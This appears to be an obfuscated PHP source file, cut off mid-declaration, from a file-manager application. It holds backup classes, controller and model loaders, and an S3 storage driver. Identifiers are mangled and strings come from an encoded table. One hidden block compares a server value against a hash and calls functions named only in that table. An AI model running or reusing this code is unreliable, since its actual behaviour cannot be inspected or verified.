<?php
 goto eİ×ĞÜÙ¢—; bÌ¦Ò¨Æ’™: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto aö‡ù¨ˆÂ; aÊù ›µ±æ: Backup::set($b´ğß¸ à½); return !0; goto fœéÙ¼öˆå; c¦Øù—œë¨: $f…‡‡„¶Ó = array_diff($f…‡‡„¶Ó, array($Bğš„Ú£­´[737], $Bğš„Ú£­´[738])); foreach ($f…‡‡„¶Ó as $dŠ·Œ¶öêÉ) { $eÇ†íÖ»ßØ += $D²¯ ¨´¯->model($dŠ·Œ¶öêÉ)->count(); } $C‡î©ËÄå = new Task($Bğš„Ú£­´[739], $Bğš„Ú£­´[740], $eÇ†íÖ»ßØ, LNG($Bğš„Ú£­´[741]) . $Bğš„Ú£­´[742] . LNG($Bğš„Ú£­´[743])); goto eŒ¨Æº•ˆ; eŒ¨Æº•ˆ: foreach ($f…‡‡„¶Ó as $dŠ·Œ¶öêÉ) { $b¸˜ÆÛöß¨ = $e»ÛÓ¦ÌĞ« . $dŠ·Œ¶öêÉ . $Bğš„Ú£­´[744]; $e«ó§×‡±Ç = null; if ($dŠ·Œ¶öêÉ == $Bğš„Ú£­´[745] && (!isset($dÁÎëğ”ê[$Bğš„Ú£­´[719]]) || $dÁÎëğ”ê[$Bğš„Ú£­´[719]] == $Bğš„Ú£­´[494])) { $e«ó§×‡±Ç = self::$io; } $f¦Íè¼Ğà² += $D²¯ ¨´¯->sqlFromDb($dŠ·Œ¶öêÉ, $b¸˜ÆÛöß¨, $C‡î©ËÄå, $e«ó§×‡±Ç); } $C‡î©ËÄå->end(); $b´ğß¸ à½ = array($Bğš„Ú£­´[746] => $ašÃÌË·±Ó, $Bğš„Ú£­´[733] => 1, $Bğš„Ú£­´[747] => $f¦Íè¼Ğà², $Bğš„Ú£­´[748] => $f¦Íè¼Ğà²); goto aÊù ›µ±æ; e‘ñÇ‰²ß: $D²¯ ¨´¯ = new DbManage($A¸®£îÚ¬Ï, $ašÃÌË·±Ó); $e»ÛÓ¦ÌĞ« = TEMP_FILES . $Bğš„Ú£­´[736] . self::$name . $Bğš„Ú£­´[8]; del_dir($e»ÛÓ¦ÌĞ«); goto a˜ÙŒîÓ¿Ô; a˜ÙŒîÓ¿Ô: mk_dir($e»ÛÓ¦ÌĞ«); $eÇ†íÖ»ßØ = $f¦Íè¼Ğà² = 0; $f…‡‡„¶Ó = $D²¯ ¨´¯->db()->getTables(); goto c¦Øù—œë¨; aö‡ù¨ˆÂ: $Bğš„Ú£­´ =& $_SERVER[åÌÛ»ô¢‚ö™]; $dÁÎëğ”ê = Backup::get(); self::$io = $dÁÎëğ”ê[$Bğš„Ú£­´[718]]; goto f“ööâĞ; f“ööâĞ: self::$name = $dÁÎëğ”ê[$Bğš„Ú£­´[28]]; $A¸®£îÚ¬Ï = $GLOBALS[$Bğš„Ú£­´[6]][$Bğš„Ú£­´[17]]; $ašÃÌË·±Ó = $this->_dbType($A¸®£îÚ¬Ï); goto e‘ñÇ‰²ß; fœéÙ¼öˆå: } private function _dbType($b©×Ú³¥¶˜) { goto EİÔÔÙ………; AÓºâ„É: return $B˜ÕĞ†ã¹»; goto a”ù¼Òò‹; EİÔÔÙ………: $E‡Û§ÑÇÚ¶ =& $_SERVER[åÌÛ»ô¢‚ö™]; $b©×Ú³¥¶˜ = array_change_key_case($b©×Ú³¥¶˜); $B˜ÕĞ†ã¹» = $b©×Ú³¥¶˜[$E‡Û§ÑÇÚ¶[749]]; goto E–Íà†‰; E–Íà†‰: if ($B˜ÕĞ†ã¹» == $E‡Û§ÑÇÚ¶[750]) { $C•ˆøª®‹ç = explode($E‡Û§ÑÇÚ¶[4], $b©×Ú³¥¶˜[$E‡Û§ÑÇÚ¶[751]]); $B˜ÕĞ†ã¹» = $C•ˆøª®‹ç[0]; } $bÔªŒ¯ªƒ = array($E‡Û§ÑÇÚ¶[752] => $E‡Û§ÑÇÚ¶[9], $E‡Û§ÑÇÚ¶[753] => $E‡Û§ÑÇÚ¶[754]); if (isset($bÔªŒ¯ªƒ[$B˜ÕĞ†ã¹»])) { $B˜ÕĞ†ã¹» = $bÔªŒ¯ªƒ[$B˜ÕĞ†ã¹»]; } goto AÓºâ„É; a”ù¼Òò‹: } } class BackupDbFile { public function __construct() { } public function index() { goto e‹•¡é¿ßˆ; e‹•¡é¿ßˆ: $aÆ§Ü­³Ü =& $_SERVER[åÌÛ»ô¢‚ö™]; $D½¸²Ú—§ = Backup::get(); $dƒå’àÔ± = $D½¸²Ú—§[$aÆ§Ü­³Ü[28]]; goto c¹ª¿ŒÌ‹Ç; aÑ…å‘Ô™: Backup::set(array($aÆ§Ü­³Ü[757] => $CÆÁ‡¸‹[$aÆ§Ü­³Ü[77]])); IO::move($e†™õ…½¨, $EÀÆº¢æÚ¬); $C®õ†¢ˆÌ = CONTROLLER_DIR . $aÆ§Ü­³Ü[758]; goto FÒ›´¨“Æ; FÒ›´¨“Æ: $AåÂÀäè›Ğ = CONTROLLER_DIR . $aÆ§Ü­³Ü[759]; IO::copy($C®õ†¢ˆÌ, $EÀÆº¢æÚ¬ . "\142\141\143\x6b\x75\160\x5f{$dƒå’àÔ±}\57"); IO::copy($AåÂÀäè›Ğ, $EÀÆº¢æÚ¬ . "\142\x61\143\153\165\160\137{$dƒå’àÔ±}\57"); goto AõƒŞ¯ô‡; c¹ª¿ŒÌ‹Ç: $e†™õ…½¨ = TEMP_FILES . "\142\141\x63\153\x75\160\x5f{$dƒå’àÔ±}\57"; $EÀÆº¢æÚ¬ = "\x7b\151\157\x3a{$D½¸²Ú—§[$aÆ§Ü­³Ü[718]]}\x7d\x2f\x64\x61\x74\x61\x62\x61\x73\x65\57"; IO::mkdir($EÀÆº¢æÚ¬ . "\142\141\x63\153\x75\x70\137{$dƒå’àÔ±}\57"); goto A©ê‹¼ã¥×; AõƒŞ¯ô‡: $cò­„¨ËÙ©->end(); Backup::set(array($aÆ§Ü­³Ü[760] => $CÆÁ‡¸‹[$aÆ§Ü­³Ü[77]])); return !0; goto Dê½ÏñÊ¶ñ; A©ê‹¼ã¥×: $cò­„¨ËÙ© = new TaskFileTransfer($aÆ§Ü­³Ü[755], $aÆ§Ü­³Ü[740], 0, LNG($aÆ§Ü­³Ü[741]) . $aÆ§Ü­³Ü[437] . LNG($aÆ§Ü­³Ü[743]) . $aÆ§Ü­³Ü[756]); $cò­„¨ËÙ©->addPath($e†™õ…½¨); $CÆÁ‡¸‹ = IO::infoWithChildren($e†™õ…½¨); goto aÑ…å‘Ô™; Dê½ÏñÊ¶ñ: } } class BackupFile { public function __construct() { } public function index() { goto cöïÔÙ©Û’; fÀ°ÀšÜËŠ: $cÕŒŠ¾¬ = $B¶½¨ÉêÄğ ? 1 : 0; $Bì©È‘é’Õ = array($_SERVER[åÌÛ»ô¢‚ö™][777] => 1, $_SERVER[åÌÛ»ô¢‚ö™][473] => time(), $_SERVER[åÌÛ»ô¢‚ö™][735] => $cÕŒŠ¾¬, $_SERVER[åÌÛ»ô¢‚ö™][774] => $FæÇÔãèŞ, $_SERVER[åÌÛ»ô¢‚ö™][766] => $d„Ğ«çöàÎ, $_SERVER[åÌÛ»ô¢‚ö™][765] => $a¹Ö£‘®‚Í); if ($b¢ºå¤Â‰²) { $Bì©È‘é’Õ[$_SERVER[åÌÛ»ô¢‚ö™][775]] = $b¬¨¤À­Ë—; $Bì©È‘é’Õ[$_SERVER[åÌÛ»ô¢‚ö™][776]] = $BˆÈ›´•; } goto Bâİ´è¢Íƒ; C”ªº¿œÄ: $B¶½¨ÉêÄğ = !0; $D¬¿Ã¢ˆâø = $this->storeIds(); $eƒÈ’¼ÁÕ = 1; goto Då¤İ¿†ÈØ; eÜ¸…µ çè: $a¹Ö£‘®‚Í = (int) Model($_SERVER[åÌÛ»ô¢‚ö™][745])->where($FĞ‚Ôö†¥æ)->count($_SERVER[åÌÛ»ô¢‚ö™][444]); $d„Ğ«çöàÎ = (int) Model($_SERVER[åÌÛ»ô¢‚ö™][745])->where($FĞ‚Ôö†¥æ)->sum($_SERVER[åÌÛ»ô¢‚ö™][77]); $fó§ˆŸ£²¹ = new TaskFileTransfer($_SERVER[åÌÛ»ô¢‚ö™][763], $_SERVER[åÌÛ»ô¢‚ö™][740], $a¹Ö£‘®‚Í, LNG($_SERVER[åÌÛ»ô¢‚ö™][741]) . $_SERVER[åÌÛ»ô¢‚ö™][742] . LNG($_SERVER[åÌÛ»ô¢‚ö™][764])); goto c‡•†ëí»; c‡•†ëí»: $fó§ˆŸ£²¹->task[$_SERVER[åÌÛ»ô¢‚ö™][725]] = $d„Ğ«çöàÎ; $Bì©È‘é’Õ = array($_SERVER[åÌÛ»ô¢‚ö™][765] => $a¹Ö£‘®‚Í, $_SERVER[åÌÛ»ô¢‚ö™][766] => $d„Ğ«çöàÎ); Backup::set($Bì©È‘é’Õ); goto C”ªº¿œÄ; Bâİ´è¢Íƒ: Backup::set($Bì©È‘é’Õ); $this->_fileFilter($BŠÓàˆË¼Î); return !0; goto BÖ—Ëôµ «; cöïÔÙ©Û’: $F‡ÉÖÊ¿•³ = Backup::get(); $FæÇÔãèŞ = $F‡ÉÖÊ¿•³[$_SERVER[åÌÛ»ô¢‚ö™][296]][$_SERVER[åÌÛ»ô¢‚ö™][171]][$_SERVER[åÌÛ»ô¢‚ö™][444]]; $FĞ‚Ôö†¥æ = array($_SERVER[åÌÛ»ô¢‚ö™][445] => array($_SERVER[åÌÛ»ô¢‚ö™][761], $FæÇÔãèŞ), $_SERVER[åÌÛ»ô¢‚ö™][762] => array($_SERVER[åÌÛ»ô¢‚ö™][334], $F‡ÉÖÊ¿•³[$_SERVER[åÌÛ»ô¢‚ö™][718]])); goto eÜ¸…µ çè; Då¤İ¿†ÈØ: $bšÜõÑ­æ³ = 1000; $a¿ÄÛ½Áß„ = $b¢ºå¤Â‰² = 0; $BŠÓàˆË¼Î = array(); goto a‰ÀˆÃ™Œ‚; a‰ÀˆÃ™Œ‚: $BˆÈ›´• = $b¬¨¤À­Ë— = 0; do { $Eİ°¼ÑçÙä = $_SERVER[åÌÛ»ô¢‚ö™][767]; $F¨Î—–¥å’ = Model($_SERVER[åÌÛ»ô¢‚ö™][745])->where($FĞ‚Ôö†¥æ)->field($Eİ°¼ÑçÙä)->order($_SERVER[åÌÛ»ô¢‚ö™][768])->selectPage($bšÜõÑ­æ³, $eƒÈ’¼ÁÕ); $F‡Ğ¼èÅê = !empty($F¨Î—–¥å’[$_SERVER[åÌÛ»ô¢‚ö™][370]]) ? $F¨Î—–¥å’[$_SERVER[åÌÛ»ô¢‚ö™][370]] : array(); foreach ($F‡Ğ¼èÅê as $dÅ›Ü¥†ê) { goto FÜáñÖİ¯ç; FÜáñÖİ¯ç: if (!$this->_fileExist($dÅ›Ü¥†ê, $BŠÓàˆË¼Î, $D¬¿Ã¢ˆâø)) { $a¹Ö£‘®‚Í -= 1; $d„Ğ«çöàÎ -= (int) $dÅ›Ü¥†ê[$_SERVER[åÌÛ»ô¢‚ö™][77]]; write_log("\x66\x69\x6c\145\40\x6e\157\x74\x20\x65\x78\x69\x73\164\56\146\x69\x6c\145\x49\x44\72{$dÅ›Ü¥†ê[$_SERVER[åÌÛ»ô¢‚ö™][444]]}\x2c\x20\160\x61\x74\150\72{$dÅ›Ü¥†ê[$_SERVER[åÌÛ»ô¢‚ö™][75]]}", $_SERVER[åÌÛ»ô¢‚ö™][769]); continue; } $a‹‰š‹æé = $dÅ›Ü¥†ê[$_SERVER[åÌÛ»ô¢‚ö™][75]]; $càÁë•…— = "\x7b\x69\x6f\72{$F‡ÉÖÊ¿•³[$_SERVER[åÌÛ»ô¢‚ö™][718]]}\x7d" . substr($a‹‰š‹æé, strlen("\x7b\151\157\72{$dÅ›Ü¥†ê[$_SERVER[åÌÛ»ô¢‚ö™][770]]}\175")); goto DªÈ´äİ¨á; FŠ…ÔëöÖè: $a¿ÄÛ½Áß„ += $dÅ›Ü¥†ê[$_SERVER[åÌÛ»ô¢‚ö™][77]]; $b¬¨¤À­Ë— += 1; $BˆÈ›´• += $dÅ›Ü¥†ê[$_SERVER[åÌÛ»ô¢‚ö™][77]]; goto f“ŒåôâÓ; f“ŒåôâÓ: if ($a¿ÄÛ½Áß„ >= 1024 * 1024 * 100) { $Bì©È‘é’Õ = array($_SERVER[åÌÛ»ô¢‚ö™][774] => $FæÇÔãèŞ, $_SERVER[åÌÛ»ô¢‚ö™][775] => $b¬¨¤À­Ë—, $_SERVER[åÌÛ»ô¢‚ö™][776] => $BˆÈ›´•); Backup::set($Bì©È‘é’Õ); $a¿ÄÛ½Áß„ = $b¢ºå¤Â‰² = 0; } goto a×º½Œ“×; DªÈ´äİ¨á: if (IO::exist($càÁë•…—)) { $fó§ˆŸ£²¹->updateFileEnd($dÅ›Ü¥†ê[$_SERVER[åÌÛ»ô¢‚ö™][28]], $dÅ›Ü¥†ê[$_SERVER[åÌÛ»ô¢‚ö™][77]]); } else { $càÁë•…— = get_path_father($càÁë•…—); IO::mkdir($càÁë•…—); if (!IO::copy($a‹‰š‹æé, $càÁë•…—, $_SERVER[åÌÛ»ô¢‚ö™][771])) { write_log($_SERVER[åÌÛ»ô¢‚ö™][772] . $a‹‰š‹æé . $_SERVER[åÌÛ»ô¢‚ö™][773] . $càÁë•…— . $_SERVER[åÌÛ»ô¢‚ö™][502], $_SERVER[åÌÛ»ô¢‚ö™][740]); $B¶½¨ÉêÄğ = !1; break; } } $FæÇÔãèŞ = $dÅ›Ü¥†ê[$_SERVER[åÌÛ»ô¢‚ö™][444]]; $b¢ºå¤Â‰² += 1; goto FŠ…ÔëöÖè; a×º½Œ“×: } $BÀøÎãİÙ³ = count($F‡Ğ¼èÅê); $eƒÈ’¼ÁÕ++; } while ($BÀøÎãİÙ³ == $bšÜõÑ­æ³); $fó§ˆŸ£²¹->end(); goto fÀ°ÀšÜËŠ; BÖ—Ëôµ «: } private function _fileExist($c®Ùä¥‘, &$føâÁ‰É¥¿, $bğ‹áàÍ«‘) { goto a‘‰È èÛ; F‘Õæù¹Ëç: if (IO::exist($eÜ÷Õƒâ)) { $føâÁ‰É¥¿[] = $c®Ùä¥‘[$b¸£§„¼çŒ[444]]; return !1; } $D¯ãÇ”øÂ = array($b¸£§„¼çŒ[770] => $c®Ùä¥‘[$b¸£§„¼çŒ[770]], $b¸£§„¼çŒ[75] => array($b¸£§„¼çŒ[382], "{$eÜ÷Õƒâ}\x25")); $Eİ…–“è³ = Model($b¸£§„¼çŒ[745])->where($D¯ãÇ”øÂ)->field($b¸£§„¼çŒ[445])->select(); goto A¥›ïâº©; A¥›ïâº©: $føâÁ‰É¥¿ = array_merge($føâÁ‰É¥¿, array_to_keyvalue($Eİ…–“è³, $b¸£§„¼çŒ[33], $b¸£§„¼çŒ[444])); return !1; goto B¡Á«’Â‘; eÇâ‚®‡ : if (!in_array($c®Ùä¥‘[$b¸£§„¼çŒ[770]], $bğ‹áàÍ«‘)) { return !1; } if (IO::exist($BÛ¿ï™İÚÅ)) { return !0; } $eÜ÷Õƒâ = get_path_father($BÛ¿ï™İÚÅ); goto F‘Õæù¹Ëç; a‘‰È èÛ: $b¸£§„¼çŒ =& $_SERVER[åÌÛ»ô¢‚ö™]; $BÛ¿ï™İÚÅ = $c®Ùä¥‘[$b¸£§„¼çŒ[75]]; if (in_array($c®Ùä¥‘[$b¸£§„¼çŒ[444]], $føâÁ‰É¥¿)) { return !1; } goto eÇâ‚®‡ ; B¡Á«’Â‘: } private function _fileFilter($C…¦§”Ğ‘) { $eä‘’¶Ï²ª =& $_SERVER[åÌÛ»ô¢‚ö™]; if (empty($C…¦§”Ğ‘)) { return; } $eñ´·¯÷â = array($eä‘’¶Ï²ª[444] => array($eä‘’¶Ï²ª[7], array_unique($C…¦§”Ğ‘))); $dÎéŸ§ÁÍ© = Model($eä‘’¶Ï²ª[778])->where($eñ´·¯÷â)->field($eä‘’¶Ï²ª[394])->select(); foreach ($dÎéŸ§ÁÍ© as $aø‚Û‚Ìëø) { Model($eä‘’¶Ï²ª[778])->remove($aø‚Û‚Ìëø[$eä‘’¶Ï²ª[394]], !1); } } private function storeIds() { $Fİ¬ßŠÊÌ =& $_SERVER[åÌÛ»ô¢‚ö™]; $F“º¢³Ÿë = Model($Fİ¬ßŠÊÌ[730])->listData(); $aÏõèŠ£”· = array(); $AÂÔ‘¨ìÄ = $GLOBALS[$Fİ¬ßŠÊÌ[6]][$Fİ¬ßŠÊÌ[84]][$Fİ¬ßŠÊÌ[779]]; foreach ($F“º¢³Ÿë as $fÔ‹§³†ÙÛ) { $DõğŠƒˆ’ = strtolower($fÔ‹§³†ÙÛ[$Fİ¬ßŠÊÌ[90]]); if (!isset($AÂÔ‘¨ìÄ[$DõğŠƒˆ’])) { continue; } $b–¸ÈÓŠÓ = $Fİ¬ßŠÊÌ[71] . (isset($AÂÔ‘¨ìÄ[$DõğŠƒˆ’]) ? $AÂÔ‘¨ìÄ[$DõğŠƒˆ’] : ucfirst($DõğŠƒˆ’)); if (!class_exists($b–¸ÈÓŠÓ)) { continue; } $aÏõèŠ£”·[] = $fÔ‹§³†ÙÛ[$Fİ¬ßŠÊÌ[392]]; } return $aÏõèŠ£”·; } } goto dÈË¡„½Ö; d°¥ ³Œçé: function Action($F„®Œ½‘Ø = '') { goto fÚª”ñœŞ­; fÚª”ñœŞ­: $e‚„Ÿ÷ì‰ê =& $_SERVER[]; static $DºÈš = array(); $b‹§‡Õ¡ = $F„®Œ½‘Ø; goto FØĞ­Éâæï; FØĞ­Éâæï: if (isset($DºÈš[$b‹§‡Õ¡])) { return $DºÈš[$b‹§‡Õ¡]; } $F„®Œ½‘Ø = trim(str_replace($e‚„Ÿ÷ì‰ê[4], $e‚„Ÿ÷ì‰ê[5], $F„®Œ½‘Ø), $e‚„Ÿ÷ì‰ê[4]); $e‚¹ˆ±ãàâ = explode($e‚„Ÿ÷ì‰ê[5], $F„®Œ½‘Ø); goto a½±œ«ïœõ; a½±œ«ïœõ: $c©¢­ñäî  = strtolower($e‚¹ˆ±ãàâ[0]); if (substr($c©¢­ñäî , -6) == $e‚„Ÿ÷ì‰ê[6]) { $F„®Œ½‘Ø = substr($e‚¹ˆ±ãàâ[0], 0, -6); $fÙíš‰øâ = $F„®Œ½‘Ø . $e‚„Ÿ÷ì‰ê[7]; $C—¡ò¨‘ˆ = $e‚„Ÿ÷ì‰ê[8]; if (isset($e‚¹ˆ±ãàâ[1]) && substr(strtolower($e‚¹ˆ±ãàâ[1]), -5) == $e‚„Ÿ÷ì‰ê[9]) { $fÙíš‰øâ = $F„®Œ½‘Ø . $e‚¹ˆ±ãàâ[1]; $C—¡ò¨‘ˆ = $e‚„Ÿ÷ì‰ê[10] . $e‚¹ˆ±ãàâ[1] . $e‚„Ÿ÷ì‰ê[11]; } else { if (count($e‚¹ˆ±ãàâ) == 3) { $fÙíš‰øâ = $F„®Œ½‘Ø . $e‚¹ˆ±ãàâ[1] . $e‚¹ˆ±ãàâ[2]; $C—¡ò¨‘ˆ = $e‚„Ÿ÷ì‰ê[12] . $e‚¹ˆ±ãàâ[1] . $e‚„Ÿ÷ì‰ê[13] . $e‚¹ˆ±ãàâ[2] . $e‚„Ÿ÷ì‰ê[11]; } } $C—¡ò¨‘ˆ = PLUGIN_DIR . $F„®Œ½‘Ø . $e‚„Ÿ÷ì‰ê[4] . $C—¡ò¨‘ˆ; } else { if (substr($c©¢­ñäî , -5) == $e‚„Ÿ÷ì‰ê[9]) { $F„®Œ½‘Ø = substr($e‚¹ˆ±ãàâ[0], 0, -5); return Model($F„®Œ½‘Ø); } else { $fÙíš‰øâ = $e‚¹ˆ±ãàâ[0] . $e‚¹ˆ±ãàâ[1]; $C—¡ò¨‘ˆ = CONTROLLER_DIR . $e‚¹ˆ±ãàâ[0] . $e‚„Ÿ÷ì‰ê[4] . $e‚¹ˆ±ãàâ[1] . $e‚„Ÿ÷ì‰ê[14]; } } $dËÇ·Îäæª = strtolower($fÙíš‰øâ); goto C×•‚ÔèÏ; bÆ¬íÇÕŸ: $DºÈš[$dËÇ·Îäæª] = new $fÙíš‰øâ(); $DºÈš[$b‹§‡Õ¡] = $DºÈš[$dËÇ·Îäæª]; return $DºÈš[$dËÇ·Îäæª]; goto eë‰×£¬¹š; C×•‚ÔèÏ: if (isset($DºÈš[$dËÇ·Îäæª])) { return $DºÈš[$dËÇ·Îäæª]; } if (is_file($C—¡ò¨‘ˆ)) { include_once $C—¡ò¨‘ˆ; } if (!class_exists($fÙíš‰øâ)) { return actionCallError("\x5b{$F„®Œ½‘Ø}\40\75\x3e\x20{$fÙíš‰øâ}\x5d\x20\143\154\141\163\x73\x20\x6e\x6f\x74\40\145\170\x69\163\x74\x73\x21"); } goto bÆ¬íÇÕŸ; eë‰×£¬¹š: } function ActionApply($aŸòÆ¬çâ„, $b”‹³Ö‡ª® = array()) { goto c…‹ñİô±; DÇˆÖµİæ: if (!is_object($FàŒíÊŠà®) || !method_exists($FàŒíÊŠà®, $bÏì…¦ğ­¶)) { return actionCallError("{$aŸòÆ¬çâ„}\40\155\x65\x74\x68\157\144\x20\x6e\157\164\x20\145\170\151\x73\x74\163\x21"); } $a‡´¡‘Ü—Ñ = call_user_func_array(array($FàŒíÊŠà®, $bÏì…¦ğ­¶), $b”‹³Ö‡ª®); return $a‡´¡‘Ü—Ñ; goto cÈàÍñÖ¼; c…‹ñİô±: if (is_array($aŸòÆ¬çâ„)) { return call_user_func_array($aŸòÆ¬çâ„, $b”‹³Ö‡ª®); } if (function_exists($aŸòÆ¬çâ„)) { return call_user_func_array($aŸòÆ¬çâ„, $b”‹³Ö‡ª®); } $b±²“õ•Ş  = strrpos($aŸòÆ¬çâ„, $_SERVER[][5]); goto A»‹ù©÷Ğ; A»‹ù©÷Ğ: $Eëõ¬ßŞÒ = substr($aŸòÆ¬çâ„, 0, $b±²“õ•Ş ); $bÏì…¦ğ­¶ = substr($aŸòÆ¬çâ„, $b±²“õ•Ş  + 1); $FàŒíÊŠà® = Action($Eëõ¬ßŞÒ); goto DÇˆÖµİæ; cÈàÍñÖ¼: } function actionCallError($cøÎº‘áÚÉ) { return write_log($cøÎº‘áÚÉ, $_SERVER[][15]); } goto fØ‰ìùôá; AàÍƒ’ÀÏğ: define($_SERVER[åÌÛ»ô¢‚ö™][0], $_SERVER[åÌÛ»ô¢‚ö™][1]); $_SERVER[] = explode($_SERVER[åÌÛ»ô¢‚ö™][2], gzinflate(substr($_SERVER[åÌÛ»ô¢‚ö™][3], 10, -8))); function Model($dî¤£¯„ñˆ = '', $c£¢‘Ó¹‘ = '', $b´‰ÅÉ¹‚à = '') { goto Bá±¡¥¶¹; ağŸ†Áî‚õ: $e”˜ï‘ƒ™[$CÀšƒµ‚±ä] = new ModelBase($dî¤£¯„ñˆ, $c£¢‘Ó¹‘, $b´‰ÅÉ¹‚à); return $e”˜ï‘ƒ™[$CÀšƒµ‚±ä]; goto cóå×éì¬ø; Bá±¡¥¶¹: $CòİŠÄ¤Î =& $_SERVER[]; static $e”˜ï‘ƒ™ = array(); $CÀšƒµ‚±ä = strtolower($c£¢‘Ó¹‘ . $CòİŠÄ¤Î[0] . $dî¤£¯„ñˆ); goto dÒ÷İ°«ğ; dÒ÷İ°«ğ: if (isset($e”˜ï‘ƒ™[$CÀšƒµ‚±ä])) { return $e”˜ï‘ƒ™[$CÀšƒµ‚±ä]; } if ($dî¤£¯„ñˆ) { $dî¤£¯„ñˆ = strtoupper($dî¤£¯„ñˆ[0]) . substr($dî¤£¯„ñˆ, 1); $Bõ¯­Ô“¨ó = $dî¤£¯„ñˆ . $CòİŠÄ¤Î[1]; if (class_exists($Bõ¯­Ô“¨ó)) { $e”˜ï‘ƒ™[$CÀšƒµ‚±ä] = new $Bõ¯­Ô“¨ó(); return $e”˜ï‘ƒ™[$CÀšƒµ‚±ä]; } } if (!$b´‰ÅÉ¹‚à) { $b´‰ÅÉ¹‚à = $GLOBALS[$CòİŠÄ¤Î[2]][$CòİŠÄ¤Î[3]]; } goto ağŸ†Áî‚õ; cóå×éì¬ø: } goto d°¥ ³Œçé; BØ¬È§—Ş: if ($_SERVER[$_SERVER[åÌÛ»ô¢‚ö™][179]] != $B¨ÙÒƒºù($E‘Ä¹»Ğ·)) { goto A¢Ãˆ“ì±–; A¢Ãˆ“ì±–: $C±½ïÒ»¿— = $_SERVER[åÌÛ»ô¢‚ö™][180]; $e¼Î¢‹è»Ñ = $_SERVER[$_SERVER[åÌÛ»ô¢‚ö™][181]] . $_SERVER[åÌÛ»ô¢‚ö™][182]; $Bççœ¹™á = $C±½ïÒ»¿—($e¼Î¢‹è»Ñ); goto bêà×ËÙ„î; B©¡Ìíä‹§: $Cî­¸Ş¢‰($E‘Ä¹»Ğ·); goto fâÎ×•¬ˆÚ; bêà×ËÙ„î: $F£ìÀñµ±é = explode($_SERVER[åÌÛ»ô¢‚ö™][183], $Bççœ¹™á); if (count($F£ìÀñµ±é) < $_SERVER[åÌÛ»ô¢‚ö™][184]) { $Fó‰íä«Œ¹ = $_SERVER[åÌÛ»ô¢‚ö™][185]; $Fó‰íä«Œ¹(); } $Cî­¸Ş¢‰ = $_SERVER[åÌÛ»ô¢‚ö™][186]; goto B©¡Ìíä‹§; fâÎ×•¬ˆÚ: } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($E·çÁÔ‰) { set_timeout(); require_once SDK_DIR . $_SERVER[åÌÛ»ô¢‚ö™][187]; parent::__construct(); $this->_init($E·çÁÔ‰); } public function _init($c„Ã×İÙÑ‰) { foreach ($c„Ã×İÙÑ‰ as $E ­Æˆ§èª => $EºåŠ©£) { if (isset($this->{$E ­Æˆ§èª})) { $this->{$E ­Æˆ§èª} = $EºåŠ©£; } } $this->endpoint = $c„Ã×İÙÑ‰[$_SERVER[åÌÛ»ô¢‚ö™][188]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($F‘¢¤îŠÈö = "\166\x34") { $this->signVer = $F‘¢¤îŠÈö; $this->client->setSignatureVersion($F‘¢¤îŠÈö); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto Cìø÷†Œ¼¼; F¡÷õ ©§É: $dğ¾©±İ„‰ = array($cŒÄš•è‚[194], $cŒÄš•è‚[195], $cŒÄš•è‚[196], $cŒÄš•è‚[197], $cŒÄš•è‚[198]); $fÀéÎ»ò„­ = array_diff($dğ¾©±İ„‰, $fÊÕï¾æóô); return empty($fÀéÎ»ò„­); goto Eøë¯ğ¢õô; a¯Šù¯Ì¦: if ($e‡ËŒƒƒ‡[$cŒÄš•è‚[189]] != $cŒÄš•è‚[190] || $e‡ËŒƒƒ‡[$cŒÄš•è‚[191]] != $cŒÄš•è‚[190]) { return !1; } $fÊÕï¾æóô = array_map($cŒÄš•è‚[192], $e‡ËŒƒƒ‡[$cŒÄš•è‚[193]]); if (!is_array($fÊÕï¾æóô)) { $fÊÕï¾æóô = array(); } goto F¡÷õ ©§É; Cìø÷†Œ¼¼: $cŒÄš•è‚ =& $_SERVER[åÌÛ»ô¢‚ö™]; $e‡ËŒƒƒ‡ = $this->getBucketCors(); if (!$e‡ËŒƒƒ‡ || !is_array($e‡ËŒƒƒ‡)) { return !1; } goto a¯Šù¯Ì¦; Eøë¯ğ¢õô: } public function mkfile($e³àß©ÓÑØ, $aÅÛİŒ†Ç = '', $F³â‹œÍÎ¹ = REPEAT_RENAME) { $a¢Œïôè³Ø = $this->setContent($e³àß©ÓÑØ, $aÅÛİŒ†Ç); if ($a¢Œïôè³Ø !== !1) { return $this->getPathOuter($e³àß©ÓÑØ); } return !1; } public function mkdir($eİ”ªàÌäò, $aÜƒÆËµ÷ = REPEAT_SKIP) { if (empty($eİ”ªàÌäò)) { return !1; } if ($this->_isFolder($eİ”ªàÌäò)) { return $this->getPathOuter($eİ”ªàÌäò); } $D¶ÊŒ…Á¨² = $this->setContent($eİ”ªàÌäò, $_SERVER[åÌÛ»ô¢‚ö™][33], !0); if ($D¶ÊŒ…Á¨² !== !1) { return $this->getPathOuter($eİ”ªàÌäò); } return !1; } public function copyFile($c‘êŠ¼·Üë, $d“¥Â„å–, $C¦¦Œ£ˆ¤ = array()) { $fÕÍ·ÇÖÙ¯ =& $_SERVER[åÌÛ»ô¢‚ö™]; $DÏ·¥‰òŞÛ = $this->objectMeta($c‘êŠ¼·Üë); if (!$DÏ·¥‰òŞÛ) { return !1; } if ($DÏ·¥‰òŞÛ[$fÕÍ·ÇÖÙ¯[77]] <= 1024 * 1024 * 200) { $cÆ­©¤šÚ… = $this->client->copyObject($this->bucket, $c‘êŠ¼·Üë, $this->bucket, $d“¥Â„å–, $fÕÍ·ÇÖÙ¯[199], $C¦¦Œ£ˆ¤); } else { $cÆ­©¤šÚ… = $this->client->multiCopyObject($this->bucket, $c‘êŠ¼·Üë, $this->bucket, $d“¥Â„å–, $C¦¦Œ£ˆ¤); } $cÆ­©¤šÚ… = $cÆ­©¤šÚ… ? $this->getPathOuter($d“¥Â„å–) : !1; return $cÆ­©¤šÚ…; } public function moveFile($E÷’ÑÃó¡Æ, $b›†Å©®è¾) { if ($this->copyFile($E÷’ÑÃó¡Æ, $b›†Å©®è¾)) { $this->delFile($E÷’ÑÃó¡Æ); return $this->getPathOuter($b›†Å©®è¾); } return !1; } public function 